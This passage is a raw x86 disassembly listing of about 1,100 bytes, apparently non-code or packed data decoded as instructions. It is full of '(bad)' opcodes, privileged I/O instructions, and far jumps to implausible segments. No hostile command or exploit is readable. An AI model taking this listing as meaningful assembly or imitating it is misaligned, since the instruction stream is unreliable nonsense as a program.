  421787:	fs jmp 0x42170f
  42178a:	jp     0x42174f
  42178c:	pop    ebp
  42178d:	bound  eax,QWORD PTR [esi+0x1d]
  421790:	lods   eax,DWORD PTR ds:[esi]
  421791:	adc    eax,0xb315249c
  421796:	push   ds
  421797:	push   ebx
  421798:	jmp    0xc761:0x2b2fd
  42179f:	aam    0x4c
  4217a1:	scas   eax,DWORD PTR es:[edi]
  4217a2:	popa   
  4217a3:	fnstcw WORD PTR [eax-0x317d172c]
  4217a9:	or     al,0xc4
  4217ab:	sbb    BYTE PTR [esp+ebp*2+0x4543daf1],bl
  4217b2:	xchg   BYTE PTR [esi],dh
  4217b4:	adc    BYTE PTR [eax],al
	...
  421816:	shl    DWORD PTR [eax-0x6061f47],1
  42181c:	fnstenv [ecx-0x7ac22162]
  421822:	adc    DWORD PTR [ebx],esi
  421824:	mov    edx,0x163e4ea
  421829:	add    BYTE PTR [edi],al
  42182b:	add    DWORD PTR [eax],eax
  42182d:	add    ch,bh
  42182f:	and    BYTE PTR [edx+0x74],0x30
  421833:	cli    
  421834:	sar    al,1
  421836:	test   al,0xb2
  421838:	cmp    esp,DWORD PTR [esi+esi*1]
  42183b:	adc    dh,BYTE PTR [edi+edi*1]
  42183e:	fist   DWORD PTR [ecx-0x355153b7]
  421844:	dec    esp
  421845:	jbe    0x421810
  421847:	(bad)  
  421848:	mov    eax,0xb17aeb5
  42184d:	hlt    
  42184e:	pop    edi
  42184f:	fsubr  QWORD PTR [ecx+0x33647196]
  421855:	js     0x42187c
  421857:	fmul   st(7),st
  421859:	pushf  
  42185a:	hlt    
  42185b:	dec    ebx
  42185c:	add    eax,0xa9797b45
  421861:	mov    ebp,0xbf7af9e7
  421866:	js     0x421886
  421868:	fistp  WORD PTR [edx+0x15]
  42186b:	test   DWORD PTR [eax+0x40],ebx
  42186e:	call   0x38f1db4e
  421873:	aam    0x89
  421875:	add    DWORD PTR [ecx],0xffffffd2
  421878:	sbb    BYTE PTR [edx-0x38],0x42
  42187c:	sti    
  42187d:	adc    ch,0xa8
  421880:	(bad)  
  421881:	mov    al,0x18
  421883:	mov    ah,0x29
  421885:	or     dh,cl
  421887:	xor    DWORD PTR [ebx+edx*8],ebp
  42188a:	or     eax,0xdf81f7ad
  42188f:	inc    ecx
  421890:	sbb    eax,DWORD PTR [edx-0x14cb523e]
  421896:	fidiv  DWORD PTR [ebx+eiz*2]
  421899:	test   al,cl
  42189b:	push   edx
  42189c:	sub    eax,0x5ea47d2d
  4218a1:	inc    edx
  4218a2:	mov    al,0xd8
  4218a4:	inc    eax
  4218a5:	cmp    dh,al
  4218a7:	aam    0x81
  4218a9:	shr    DWORD PTR [eax],1
  4218ab:	sbb    al,0xcc
  4218ad:	push   ecx
  4218ae:	(bad)  
  4218b1:	iret   
  4218b2:	push   esi
  4218b3:	sub    ebp,DWORD PTR [ecx+0x4b79c912]
  4218b9:	test   al,0x90
  4218bb:	ja     0x421876
  4218bd:	adc    dl,BYTE PTR [edx+0x13]
  4218c0:	pop    ecx
  4218c1:	dec    edi
  4218c2:	imul   edi,eax,0x7b
  4218c5:	inc    edi
  4218c6:	push   edi
  4218c7:	push   es
  4218c8:	dec    eax
  4218c9:	test   DWORD PTR [edi+0x4c],ecx
  4218cc:	xchg   ecx,eax
  4218cd:	stos   BYTE PTR es:[edi],al
  4218ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218cf:	xchg   edx,eax
  4218d0:	adc    eax,0xddd54fa7
  4218d5:	and    eax,0x5c5600f1
  4218da:	pushf  
  4218db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218dc:	out    dx,eax
  4218dd:	fld    QWORD PTR [edi-0x3d0148a2]
  4218e3:	or     al,0x9d
  4218e5:	xchg   esi,eax
  4218e6:	bound  edi,QWORD PTR ds:0x89b4b476
  4218ec:	outs   dx,DWORD PTR ds:[esi]
  4218ed:	xchg   edi,eax
  4218ee:	xchg   BYTE PTR [ebx-0xf],cl
  4218f1:	in     al,dx
  4218f2:	mov    ebp,0x412701db
  4218f7:	dec    esi
  4218f8:	xlat   BYTE PTR ds:[ebx]
  4218f9:	add    al,0x8f
  4218fb:	mov    eax,ds:0x79eacb09
  421900:	ds aas 
  421902:	cmp    DWORD PTR ds:0x978507f3,eax
  421908:	xchg   BYTE PTR [eax],ah
  42190a:	mov    ebx,0xff6829e5
  42190f:	addr16 push ebx
  421911:	js     0x4218d3
  421913:	xor    ecx,ebp
  421915:	push   ds
  421916:	mov    ebp,0x2cffdfd0
  42191b:	ret    0xa77f
  42191e:	rcr    bh,0x6f
  421921:	push   esi
  421922:	repnz mov ch,0x7
  421925:	in     eax,dx
  421926:	cmp    BYTE PTR [esi-0x41],dl
  421929:	and    ch,BYTE PTR ds:0xc051a96b
  42192f:	mov    edx,0x2be8559
  421934:	sub    DWORD PTR [eax],eax
	...
  421996:	(bad)  
  421997:	cld    
  421998:	je     0x4219b7
  42199a:	jbe    0x421939
  42199c:	(bad)  
  42199d:	dec    DWORD PTR [ebx-0x3d]
  4219a0:	rcl    DWORD PTR [edx-0x278edfa8],0xeb
  4219a7:	add    DWORD PTR fs:[eax],eax
  4219aa:	pop    es
  4219ab:	add    DWORD PTR [eax],eax
  4219ad:	add    BYTE PTR [edi],bl
  4219af:	aam    0x5b
  4219b1:	rcl    BYTE PTR [eax+0x2bc0a6c1],cl
  4219b7:	adc    eax,0xc88bb949
  4219bc:	xchg   ecx,eax
  4219bd:	sbb    ch,BYTE PTR [ecx+0x2731f55d]
  4219c3:	jne    0x4219d3
  4219c5:	mov    ch,BYTE PTR [ecx-0x47]
  4219c8:	out    dx,eax
  4219c9:	inc    edi
  4219ca:	sbb    ch,BYTE PTR gs:[edi]
  4219cd:	sbb    al,0x51
  4219cf:	cmp    eax,DWORD PTR [edi]
  4219d1:	rol    DWORD PTR [edi+0x4c],1
  4219d4:	sahf   
  4219d5:	fnstenv [ebx-0x6eb8d551]
  4219db:	shl    DWORD PTR [edi-0x422f58],0xa7
  4219e2:	outs   dx,DWORD PTR ds:[esi]
  4219e3:	leave  
  4219e4:	or     dl,BYTE PTR [eax+eiz*1+0x3]
  4219e8:	dec    esi
  4219e9:	jp     0x42196b
  4219eb:	sbb    ebp,DWORD PTR [edi-0x58]
  4219ee:	sar    DWORD PTR [eax-0x29],0x45
  4219f2:	cmp    esp,DWORD PTR [ebp-0x4bf544b3]
  4219f8:	mov    BYTE PTR [edi],bl
  4219fa:	jp     0x421a62
  4219fc:	test   al,0xf9
  4219fe:	dec    esp
  4219ff:	inc    edx
  421a00:	xchg   esp,eax
  421a01:	test   DWORD PTR [edx-0x32defcd3],ecx
  421a07:	pop    edx
  421a08:	into   
  421a09:	ss inc edx
  421a0b:	jmp    0x663dbef8
  421a10:	or     al,0xb0
  421a12:	bound  ebx,QWORD PTR [ecx+0x17]
  421a15:	call   0x1f44:0xd4a2b2a6
  421a1c:	fiadd  DWORD PTR [eax-0x5be19a34]
  421a22:	sahf   
  421a23:	adc    ch,BYTE PTR [edx+0x4c]
  421a26:	cwde   
  421a27:	aam    0xac
  421a29:	in     al,0xf8
  421a2b:	stos   BYTE PTR es:[edi],al
  421a2c:	xor    BYTE PTR [ebx-0x4c],0x12
  421a30:	mov    ds:0x6618459f,al
  421a35:	push   ss
  421a36:	sub    DWORD PTR [ecx+ebx*1],eax
  421a39:	cmp    eax,0x7d9560bc
  421a3e:	jl     0x421a99
  421a40:	ds mov ebp,0x3269ff4b
  421a46:	xchg   edi,eax
  421a47:	icebp  
  421a48:	mov    ah,0x4b
  421a4a:	and    al,0xdd
  421a4c:	fcom   st(4)
  421a4e:	adc    DWORD PTR [edx],ebp
  421a50:	out    0xf7,eax
  421a52:	mov    al,0x39
  421a54:	popf   
  421a55:	dec    ebp
  421a56:	or     edi,DWORD PTR [esi]
  421a58:	out    dx,eax
  421a59:	inc    ecx
  421a5a:	mov    al,ds:0x68bd3a5d
  421a5f:	bound  eax,QWORD PTR [si+0x1409]
  421a64:	ja     0x421a3e
  421a66:	test   al,0xd9
  421a68:	add    dh,BYTE PTR [ebp+0x42469563]
  421a6e:	mov    esp,0x563204a2
  421a73:	mul    DWORD PTR [eax+0x764c2fc9]
  421a79:	pop    esi
  421a7a:	inc    ecx
  421a7b:	aad    0xf4
  421a7d:	(bad)  
  421a7e:	in     eax,0xa0
  421a80:	imul   esi,ecx,0x2d
  421a83:	jo     0x421a79
  421a85:	dec    ecx
  421a86:	fnstcw WORD PTR cs:[edx]
  421a89:	sub    eax,0x2de01208
  421a8e:	add    ch,0x94
  421a91:	dec    esp
  421a92:	push   edi
  421a93:	dec    edi
  421a94:	dec    ecx
  421a95:	jne    0x421b0a
  421a97:	mov    dh,0xff
  421a99:	cli    
  421a9a:	push   ebx
  421a9b:	les    eax,FWORD PTR [edx+0x658ff4e]
  421aa1:	std    
  421aa2:	clc    
  421aa3:	bound  edx,QWORD PTR [eax]
  421aa5:	nop
  421aa6:	lds    eax,FWORD PTR cs:[ecx-0x4]
  421aaa:	cmp    BYTE PTR [ebp+0x45],ah
  421aad:	mov    esp,ss
  421aaf:	jae    0x421a94
  421ab1:	add    ecx,ecx
  421ab3:	add    DWORD PTR [edi+0x0],0x0
	...
  421b16:	push   ss
  421b17:	cdq    
  421b18:	jmp    0x37400aea
  421b1d:	fcmovnu st,st(5)
  421b1f:	sahf   
  421b20:	test   DWORD PTR [edx+0x701116e],0x165f2
  421b2a:	pop    es
  421b2b:	add    DWORD PTR [eax],eax
  421b2d:	add    BYTE PTR [ebp-0x19b2a76b],dl
  421b33:	jno    0x421b29
  421b35:	shl    esp,1
  421b37:	inc    cx
  421b39:	sub    eax,eax
  421b3b:	call   0xaca015cf
  421b40:	adc    eax,0xb64a114b
  421b45:	outs   dx,BYTE PTR ds:[esi]
  421b46:	and    al,0xf5
  421b48:	(bad)  
  421b49:	fadd   QWORD PTR [ecx-0x5b857d8]
  421b4f:	inc    esi
  421b50:	scas   al,BYTE PTR es:[edi]
  421b51:	add    esp,DWORD PTR [esi-0x2d]
  421b54:	cmp    al,0x53
  421b56:	add    DWORD PTR [edx+0x20],ecx
  421b59:	rcl    BYTE PTR [esi+0x6c],0x3b
  421b5d:	pop    ebx
  421b5e:	mov    ch,0x78
  421b60:	scas   al,BYTE PTR es:[edi]
  421b61:	xchg   dl,cl
  421b63:	pushf  
  421b64:	test   eax,ebx
  421b66:	push   edx
  421b67:	(bad)
  421b6a:	bound  esp,QWORD PTR [edx+0x770c83ac]
  421b70:	es ins DWORD PTR es:[edi],dx
  421b72:	aad    0x50
  421b74:	mov    dl,0x69
  421b76:	test   cl,al
  421b78:	dec    ecx
  421b79:	shl    BYTE PTR [eax-0x57],1
  421b7c:	shr    DWORD PTR [ebx],cl
  421b7e:	jmp    0x421b88
  421b80:	push   ds
  421b81:	jae    0x421be2
  421b83:	pusha  
  421b84:	mov    bh,0x56
  421b86:	mov    esi,0x8270be97
  421b8b:	mov    ch,al
  421b8d:	xor    DWORD PTR [edi+0x7d],ebx
  421b90:	lahf   
  421b91:	pop    es
  421b92:	inc    esp
  421b93:	pop    ds
  421b94:	movq   mm3,mm7
  421b97:	mov    bh,0xc9
  421b99:	leave  
  421b9a:	pop    eax
  421b9b:	mov    cl,0x5
  421b9d:	stos   BYTE PTR es:[edi],al
  421b9e:	xor    cl,BYTE PTR [ebx]
  421ba0:	mov    edi,0x8d9d9ca9
  421ba5:	or     eax,0x3fd6b2de
  421baa:	and    esp,edi
  421bac:	mov    ah,0xf4
  421bae:	sbb    ecx,DWORD PTR [edi]
  421bb0:	pop    ds
  421bb1:	jne    0x421ba9
  421bb3:	and    eax,0x2cf31b8c
  421bb8:	mov    BYTE PTR ds:0x2cbbc46a,dh
  421bbe:	xor    esp,DWORD PTR [ecx]
  421bc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bc1:	out    0x2b,al
  421bc3:	loope  0x421b9f
  421bc5:	xchg   esp,eax
  421bc6:	jmp    0x421bb1
  421bc8:	loope  0x421b8d
  421bca:	sbb    BYTE PTR [eax+0x61],dl
  421bcd:	fdiv   st,st(7)
  421bcf:	test   al,0x3f
  421bd1:	jmp    0x211c11db
  421bd6:	inc    ebx
  421bd7:	cmp    BYTE PTR [edi+0xb05402],al
  421bdd:	xchg   ebx,eax
  421bde:	(bad)  
  421bdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421be0:	cmc    
  421be1:	test   esp,ebp
  421be3:	lahf   
  421be4:	in     eax,dx
  421be5:	arpl   WORD PTR [esi-0x30ed0fdd],ax
  421beb:	dec    esi
  421bec:	ror    DWORD PTR [edx-0x85f3e1b],0x0
  421bf3:	aad    0xfc
  421bf5:	les    ecx,FWORD PTR [edx+0x14fa1b7f]
  421bfb:	(bad)
  421bff:	into   
  421c00:	lahf   
  421c01:	or     al,0x30
  421c03:	lea    edi,[ebp+0x41]
  421c06:	popa   
  421c07:	fs loop 0x421c3b
  421c0a:	nop
  421c0b:	in     eax,0x90
  421c0d:	fnstcw WORD PTR [edi]
  421c0f:	inc    edx
  421c10:	jne    0x421c5b
  421c12:	push   ecx
  421c13:	pop    ecx
  421c14:	jg     0x421baf
  421c16:	ffreep st(5)
  421c18:	jnp    0x421c95
  421c1a:	dec    ebx
  421c1b:	cmp    ecx,DWORD PTR [edx*4+0x51bacbf3]
  421c22:	bswap  edi
  421c24:	sub    bl,dl
  421c26:	fdiv   QWORD PTR [ecx]
  421c28:	lods   eax,DWORD PTR ds:[esi]
  421c29:	addr16 mov ch,0x97
  421c2c:	fst    st(2)
  421c2e:	cmovae ebx,DWORD PTR [ebp-0x40]
  421c32:	jae    0x421be7
  421c34:	push   0x0
	...
  421c96:	mov    al,0x6b
  421c98:	mov    ch,0xe5
  421c9a:	(bad)  
  421c9b:	push   eax
  421c9d:	jg     0x421c36
  421c9f:	shl    DWORD PTR [ebp+0x3230e719],0xc6
  421ca6:	stc    
  421ca7:	add    WORD PTR [eax],ax
  421caa:	pop    es
  421cab:	add    DWORD PTR [eax],eax
  421cad:	add    BYTE PTR [ebx-0x3e],ah
  421cb0:	(bad)  
  421cb1:	vmwrite edi,ebp
  421cb4:	(bad)  
  421cb5:	repnz add eax,0x7d016e8a
  421cbb:	stos   DWORD PTR es:[edi],eax
  421cbc:	sub    eax,0x642cfe52
  421cc1:	or     BYTE PTR [eax],bl
  421cc3:	jmp    0x421cbe
  421cc5:	popf   
  421cc6:	xor    DWORD PTR [eax-0x1b137c19],0xffffffc7
  421ccd:	sub    cl,BYTE PTR [ecx-0x71]
  421cd0:	nop
  421cd1:	jp     0x421d24
  421cd3:	stos   DWORD PTR es:[edi],eax
  421cd4:	addr16 (bad) 
  421cd7:	add    BYTE PTR [edx],ch
  421cd9:	mov    edx,0x344f810d
  421cde:	push   esi
  421cdf:	arpl   WORD PTR [ebx-0x7bea0854],di
  421ce5:	stos   BYTE PTR es:[edi],al
  421ce6:	nop
  421ce7:	pop    eax
  421ce8:	dec    eax
  421ce9:	ss mov bh,0xfc
  421cec:	pop    es
  421ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cee:	cmp    esi,esp
  421cf0:	addr16 jnp 0x421ca0
  421cf3:	mov    DWORD PTR [edi-0x79],esp
  421cf6:	cmp    DWORD PTR [eax+eax*2-0x74],edi
  421cfa:	test   al,0x63
  421cfc:	lahf   
  421cfd:	fiadd  WORD PTR [edx-0x1f]
  421d00:	push   edx
  421d01:	fdivr  st,st(7)
  421d03:	dec    ebx
  421d04:	pusha  
  421d05:	jg     0x421c97
  421d07:	jo     0x421cce
  421d09:	jno    0x421d69
  421d0b:	mov    ebx,DWORD PTR [edi-0x43]
  421d0e:	mov    edi,DWORD PTR [ecx-0x595db9da]
  421d14:	pop    ss
  421d15:	(bad)  
  421d16:	mov    edx,0x84748f51
  421d1b:	mov    ds:0x9d2f33ec,al
  421d20:	dec    ecx
  421d21:	jae    0x421cb5
  421d23:	sub    al,0xe3
  421d25:	fcom   QWORD PTR [eax+ecx*8+0x45]
  421d29:	cli    
  421d2a:	iret   
  421d2b:	jno    0x421d1b
  421d2d:	push   0x5dae54a5
  421d32:	mov    al,ds:0x83e6b554
  421d37:	sbb    al,0x5b
  421d39:	rcr    DWORD PTR [eax-0x277f60ac],1
  421d3f:	scas   eax,DWORD PTR es:[edi]
  421d40:	cmp    bh,BYTE PTR [edx+eiz*8-0x28a87c27]
  421d47:	jb     0x421d5d
  421d49:	mov    ebp,0x8ebde6f3
  421d4e:	test   BYTE PTR cs:[ebp-0x4db0da99],dl
  421d55:	push   edx
  421d56:	xor    al,BYTE PTR [di-0x6]
  421d5a:	inc    ecx
  421d5b:	enter  0xad70,0x72
  421d5f:	adc    BYTE PTR [edx+0x7fe67e61],0x3e
  421d66:	shl    ebp,1
  421d68:	dec    esi
  421d69:	push   cs
  421d6a:	ror    BYTE PTR [ebx],cl
  421d6c:	jg     0x421d4b
  421d6e:	call   0x8ebf:0xcd777fe5
  421d75:	or     BYTE PTR [ebp+0x6b],0xf8
  421d79:	and    ecx,DWORD PTR es:[edi+ecx*2]
  421d7d:	enter  0xf495,0x75
  421d81:	inc    esi
  421d82:	jb     0x421dee
  421d84:	mov    cl,0xae
  421d86:	test   DWORD PTR [edx+eax*4+0x7c],0xf87acf62
  421d8e:	jge    0x421d1f
  421d90:	dec    ebp
  421d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d92:	mov    ds:0x9d8cef97,eax
  421d97:	jne    0x421dde
  421d99:	shr    BYTE PTR [eax+0x44350ba2],1
  421d9f:	or     ch,BYTE PTR [esi]
  421da1:	aam    0xd
  421da3:	cmc    
  421da4:	into   
  421da5:	pop    edx
  421da6:	lods   eax,DWORD PTR ds:[esi]
  421da7:	and    eax,0x6645d329
  421dac:	push   ds
  421dad:	ret    0x9107
  421db0:	sub    al,0x2f
  421db2:	std    
  421db3:	popf   
  421db4:	mov    eax,0x0
	...
  421e15:	add    bh,cl
  421e17:	mov    eax,ds:0xbf7f851b
  421e1c:	fucomip st,st(3)
  421e1e:	lock jbe 0x421e3b
  421e21:	cmp    BYTE PTR [edi+0x1cb6ae],ah
  421e27:	push   0x1070001
  421e2c:	add    BYTE PTR [eax],al
  421e2e:	xor    edx,DWORD PTR [edx+0x44]
  421e31:	jnp    0x421dc0
  421e33:	adc    eax,0xe7bd2b1c
  421e38:	mov    cl,0xd8
  421e3a:	add    al,0x45
  421e3c:	push   ds
  421e3d:	push   0xa65d9115
  421e42:	xor    DWORD PTR [edi-0xd],eax
  421e45:	mov    ecx,0xfa124815
  421e4a:	inc    ebx
  421e4b:	jge    0x421dd8
  421e4d:	mov    ecx,0x7b456d6c
  421e52:	mov    ch,0x52
  421e54:	into   
  421e55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e56:	adc    DWORD PTR [eax],esp
  421e58:	add    edx,esi
  421e5a:	outs   dx,BYTE PTR ds:[esi]
  421e5b:	sbb    eax,0xefe5e606
  421e60:	div    ecx
  421e62:	cmp    esp,ebp
  421e64:	retf   
  421e65:	icebp  
  421e66:	sbb    BYTE PTR [ebp+0x8421828],0xea
  421e6d:	int3   
  421e6e:	cmp    al,BYTE PTR [eax]
  421e70:	or     al,0x78
  421e72:	mov    esi,0xa3dc4639
  421e77:	mov    edx,0x4cd83277
  421e7c:	or     bh,bl
  421e7e:	cwde   
  421e7f:	mov    gs,WORD PTR [ecx+eiz*8-0xc]
  421e83:	mov    esi,0x9f54d66d
  421e88:	mov    dh,0xca
  421e8a:	add    eax,edi
  421e8c:	add    WORD PTR [edi-0x18],0x6e
  421e91:	adc    BYTE PTR [edi-0x66],ch
  421e94:	ror    ch,0x88
  421e97:	jmp    0x421e1c
  421e99:	pop    ebx
  421e9a:	dec    ebp
  421e9b:	push   ecx
  421e9c:	and    eax,0x11c4be5d
  421ea1:	xor    DWORD PTR [ebx],esp
  421ea3:	and    edx,DWORD PTR [edx+ecx*1]
  421ea6:	bound  edi,QWORD PTR [esi+0x50]
  421ea9:	mov    eax,ds:0x5b24a8e2
  421eae:	adc    DWORD PTR [eax-0x2c],edx
  421eb1:	call   0x4d62e394
  421eb6:	xchg   edx,eax
  421eb7:	jmp    0x741a4383
  421ebc:	cs pop edx
  421ebe:	lock add eax,0xf29d383
  421ec4:	test   BYTE PTR [ecx-0x2e],al
  421ec7:	push   es
  421ec8:	inc    edi
  421ec9:	jp     0x421eb2
  421ecb:	loop   0x421ee0
  421ecd:	jae    0x421ed7
  421ecf:	call   0x6787:0xd9dff069
  421ed6:	add    BYTE PTR [esi-0x522b81cb],al
  421edc:	mov    ds:0x58f69ca8,al
  421ee1:	enter  0x4a5a,0x9f
  421ee5:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ee7:	repnz mov esi,0x1a34bd7
  421eed:	lods   eax,DWORD PTR ds:[esi]
  421eee:	or     eax,0x4228a142
  421ef3:	lods   al,BYTE PTR ds:[esi]
  421ef4:	mov    DWORD PTR [edx+0x20438c00],ebp
  421efa:	mov    esp,cs
  421efc:	test   eax,esp
  421efe:	mov    cl,0x6b
  421f00:	cld    
  421f01:	jge    0x421f4e
  421f03:	hlt    
  421f04:	mov    ecx,0xf0a7a1c0
  421f09:	jl     0x421efc
  421f0b:	aas    
  421f0c:	int    0xba
  421f0e:	out    dx,al
  421f0f:	dec    eax
  421f10:	aad    0xf3
  421f12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f13:	dec    ebp
  421f14:	outs   dx,DWORD PTR ds:[esi]
  421f15:	or     BYTE PTR [esi],cl
  421f17:	push   0xcdd205b9
  421f1c:	jp     0x421ec4
  421f1e:	call   ebx
  421f20:	pop    ss
  421f21:	es call 0x21cd:0x5b48ad14
  421f29:	shl    BYTE PTR [eax-0x1d1ea3fd],cl
  421f2f:	sub    eax,0x35f78b7b
  421f34:	xchg   BYTE PTR [eax],al
	...
  421f96:	imul   eax,DWORD PTR [esi],0xffffff8f
  421f99:	dec    edi
  421f9a:	out    dx,eax
  421f9b:	iret   
  421f9c:	jmp    0x421fc4
  421f9e:	das    
  421f9f:	mov    esi,0x1e9eaf78
  421fa4:	icebp  
  421fa5:	push   ebp
  421fa6:	pop    es
  421fa7:	imul   eax,DWORD PTR [ecx],0x10700
  421fad:	add    BYTE PTR [ebx+eiz*4],bh
  421fb0:	xor    eax,0x3b95f196
  421fb5:	je     0x421f53
  421fb7:	popa   
  421fb8:	ja     0x42201f
  421fba:	inc    ebp
  421fbb:	icebp  
  421fbc:	iret   
  421fbd:	test   DWORD PTR [ebx+0x785b2482],esp
  421fc3:	leave  
  421fc4:	adc    dh,BYTE PTR [eax+0x677c3759]
  421fca:	ins    DWORD PTR es:[edi],dx
  421fcb:	or     dh,dl
  421fcd:	mov    dh,0x13
  421fcf:	push   esi
  421fd0:	cmp    dh,bh
  421fd2:	jle    0x422024
  421fd4:	stos   DWORD PTR es:[edi],eax
  421fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fd6:	pushf  
  421fd7:	dec    edx
  421fd8:	ret    0x542b
  421fdb:	dec    ebx
  421fdc:	xchg   ebx,eax
  421fdd:	mov    edx,eax
  421fdf:	test   eax,0x9605efe6
  421fe4:	sbb    esi,DWORD PTR [eax]
  421fe6:	fld    QWORD PTR [ecx-0x1b]
  421fe9:	jae    0x421fad
  421feb:	out    0xc3,al
  421fed:	lods   al,BYTE PTR ds:[esi]
  421fee:	xor    DWORD PTR [ecx-0x42],0x17b07b4d
  421ff5:	xchg   ebx,eax
  421ff6:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  421ff8:	aam    0x7c
  421ffa:	xlat   BYTE PTR ds:[ebx]
  421ffb:	mov    ch,0xd9
  421ffd:	mov    esp,0xfaab77d1
  422002:	sbb    eax,0x89ff09c
  422007:	mov    ebx,0x5fabd813
  42200c:	mov    al,ds:0xbb61a6f1
  422011:	xchg   BYTE PTR [ebp-0x1d],al
  422014:	sub    al,0xe8
  422016:	(bad)  
  422017:	scas   al,BYTE PTR es:[edi]
  422018:	add    bl,BYTE PTR [ebx]
  42201a:	cld    
  42201b:	dec    edi
  42201c:	or     eax,0x90d0121a
  422021:	jb     0x42207e
  422023:	mov    ecx,0x95e518e2
  422028:	mov    edx,0x86e0a165
  42202d:	sbb    esp,DWORD PTR ds:0xb35e7a79
  422034:	add    BYTE PTR [eax+0x69],ah
  422037:	ss pop esi
  422039:	sub    ah,cl
  42203b:	popa   
  42203c:	mov    cl,0x26
  42203e:	add    esi,DWORD PTR [ebx+0x175aafb8]
  422044:	and    BYTE PTR [ecx],bh
  422046:	mov    bh,BYTE PTR [edx-0x44]
  422049:	pop    ecx
  42204a:	in     al,dx
  42204b:	call   0xf49d:0x15c6885b
  422052:	(bad)  
  422053:	loopne 0x422092
  422055:	jo     0x421fe7
  422057:	std    
  422058:	mov    ch,0x68
  42205a:	stos   BYTE PTR es:[edi],al
  42205b:	or     BYTE PTR [edi+edi*1-0x1b],cl
  42205f:	mov    eax,esi
  422061:	cmc    
  422062:	push   ds
  422063:	mov    ebx,0x8402ef3a
  422068:	mov    dl,0x60
  42206a:	(bad)  
  42206b:	sti    
  42206c:	test   eax,0x8e87f674
  422071:	clc    
  422072:	push   ecx
  422073:	out    dx,al
  422074:	lods   eax,DWORD PTR ds:[esi]
  422075:	stos   BYTE PTR es:[edi],al
  422076:	cwde   
  422077:	in     eax,dx
  422078:	cmp    al,0x33
  42207a:	xchg   edi,eax
  42207b:	jl     0x42206b
  42207d:	ins    BYTE PTR es:[edi],dx
  42207e:	push   edi
  42207f:	hlt    
  422080:	xlat   BYTE PTR ds:[ebx]
  422081:	mov    DWORD PTR [edi+0x57],edi
  422084:	jo     0x4220ad
  422086:	loop   0x422103
  422088:	aas    
  422089:	addr16 inc edi
  42208b:	fdivr  QWORD PTR [esi+0x7fec74c4]
  422091:	out    0xad,eax
  422093:	jmp    0xa0ce:0xd03e5c9e
  42209a:	adc    edi,ebp
  42209c:	shl    BYTE PTR [edi-0x40cf249],1
  4220a2:	mov    esp,0x758244c8
  4220a7:	mov    eax,ds:0x997255a9
  4220ac:	mov    eax,ds:0xd5ed9535
  4220b1:	mov    fs,WORD PTR [eax+ecx*1]
  4220b4:	cmp    al,0x0
	...
  422116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422117:	push   edx
  422118:	jnp    0x422117
  42211a:	(bad)  
  42211b:	std    
  42211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211d:	pop    ebx
  42211e:	or     ebx,ebp
  422120:	retf   0xdd5c
  422123:	aam    0xc2
  422125:	jno    0x422135
  422127:	push   0x1
  422129:	add    BYTE PTR [edi],al
  42212b:	add    DWORD PTR [eax],eax
  42212d:	add    BYTE PTR [esi-0x5f],dh
  422130:	popa   
  422131:	and    ebp,ecx
  422133:	fsub   DWORD PTR [edx+ebx*4-0x15]
  422137:	out    dx,eax
  422138:	(bad)  
  422139:	(bad)  
  42213b:	dec    ebx
  42213c:	inc    ebx
  42213d:	ds popf 
  42213f:	(bad)  
  422140:	(bad)  
  422141:	jl     0x4220f4
  422143:	mov    ch,0xd2
  422145:	sti    
  422146:	xor    BYTE PTR [esi-0xe],al
  422149:	dec    esp
  42214a:	mov    dh,0xeb
  42214c:	mov    BYTE PTR [esi-0x40],bl
  42214f:	bound  ebx,QWORD PTR [ebx-0x2f]
  422152:	fnsave [ebx-0x51d66c42]
  422158:	retf   
  422159:	loopne 0x4220ea
  42215b:	ins    BYTE PTR es:[edi],dx
  42215c:	jle    0x422160
  42215e:	xor    BYTE PTR [edi-0x42],bh
  422161:	mov    esp,DWORD PTR [edx+0x11b94491]
  422167:	repnz xor al,BYTE PTR [eax+ecx*1+0x7e]
  42216c:	push   ss
  42216d:	push   eax
  42216e:	or     cl,dh
  422170:	ror    BYTE PTR [eax+edi*1],cl
  422173:	push   edx
  422174:	pop    ecx
  422175:	sub    al,0x7e
  422177:	mov    esi,0xe3220b88
  42217c:	sub    DWORD PTR [edx],ebp
  42217e:	xor    dh,BYTE PTR [eax-0x5c]
  422181:	jge    0x422199
  422183:	xor    al,0xf3
  422185:	mov    ds:0x673cc40f,al
  42218a:	push   eax
  42218b:	scas   eax,DWORD PTR es:[edi]
  42218c:	mov    bl,0xbd
  42218e:	(bad)  
  42218f:	sub    cl,bl
  422191:	sbb    ebx,DWORD PTR [esi+0x1bbee587]
  422197:	sbb    DWORD PTR [eax-0x2d],0x3ebfb5da
  42219e:	inc    eax
  42219f:	inc    eax
  4221a0:	jg     0x422190
  4221a2:	pop    ss
  4221a3:	adc    BYTE PTR [ebp-0x666ea65b],bh
  4221a9:	push   esi
  4221aa:	ins    BYTE PTR es:[edi],dx
  4221ab:	mov    ah,0xea
  4221ad:	jecxz  0x422170
  4221af:	cmp    al,0x80
  4221b1:	mov    esp,0xd00f1312
  4221b6:	call   0xdc4b12b7
  4221bb:	sar    al,cl
  4221bd:	sub    al,0x2d
  4221bf:	test   DWORD PTR [eax+0xaa7c122],0xd0ff4d57
  4221c9:	popa   
  4221ca:	pop    ecx
  4221cb:	mov    edi,DWORD PTR [ebx-0x17094715]
  4221d1:	mov    ch,0x23
  4221d3:	(bad)  
  4221d4:	adc    dh,ah
  4221d6:	aas    
  4221d7:	lock pop ss
  4221d9:	or     al,0x52
  4221db:	cwde   
  4221dc:	in     eax,0x6e
  4221de:	pusha  
  4221df:	(bad)  
  4221e0:	(bad)  
  4221e1:	dec    esi
  4221e2:	mov    DWORD PTR [edx+0x5ae76ce7],ebp
  4221e8:	lods   eax,DWORD PTR ds:[esi]
  4221e9:	inc    ebp
  4221ea:	mov    ah,0xfe
